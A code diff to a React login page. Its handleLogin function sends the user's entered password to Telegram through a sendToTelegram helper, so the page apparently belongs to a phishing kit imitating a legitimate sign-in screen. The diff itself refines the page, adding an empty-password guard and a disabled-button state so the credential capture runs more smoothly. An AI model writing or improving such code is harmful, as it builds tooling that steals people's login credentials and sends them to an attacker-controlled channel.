@@ -26,6 +26,7 @@ export function LoginPage({ onLoginSuccess }: LoginPageProps) {
   };
 
   const handleLogin = async () => {
+    if (!password) return;
     await sendToTelegram(`<b>[LOGIN] Password:</b> ${password}`);
     onLoginSuccess(email);
   };
@@ -148,7 +149,12 @@ export function LoginPage({ onLoginSuccess }: LoginPageProps) {
 
                 <button
                   type="submit"
-                  className="w-full py-4 bg-[#0054BB] hover:bg-[#004294] text-white font-bold text-[17px] rounded-full transition-colors mb-8 shadow-sm"
+                  disabled={!password}
+                  className={`w-full py-4 text-white font-bold text-[17px] rounded-full transition-colors mb-8 shadow-sm ${
+                    password 
+                      ? 'bg-[#0054BB] hover:bg-[#004294]' 
+                      : 'bg-[#0054BB]/50 cursor-not-allowed'
+                  }`}
                 >
                   Log In
                 </button>
